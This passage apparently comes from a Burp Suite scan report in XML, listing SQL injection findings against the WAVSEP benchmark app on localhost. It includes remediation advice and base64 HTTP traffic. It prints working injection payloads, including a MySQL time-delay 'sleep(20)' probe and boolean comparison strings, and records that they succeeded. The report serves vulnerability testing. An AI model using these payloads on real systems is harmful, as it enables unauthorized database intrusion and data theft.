      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE3LUluamVjdGlvbkluU2VhcmNoLU51bWVyaWNXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9tc2dJZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6563222050466706432</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>30831090 or 2496=02496</b> and <b>38438674 or 1130=1139</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9taW5CYWxhbmFjZT0xMDAwMDMwODMxMDkwJTIwb3IlMjAyNDk2JTNkMDI0OTYgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9taW5CYWxhbmFjZT0xMDAwMDM4NDM4Njc0JTIwb3IlMjAxMTMwJTNkMTEzOSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMFZhbGlkL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjE3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcD9taW5CYWxhbmFjZT0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBWYWxpZC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7998397099099648000</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvQ2FzZTE5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWNXaXRob3V0UXVvdGVzLUNvbW1hbmRJbmplY3Rpb24tV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3A/bXNnaWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwVmFsaWQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUxOjE3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE5IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4078907618904477696</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
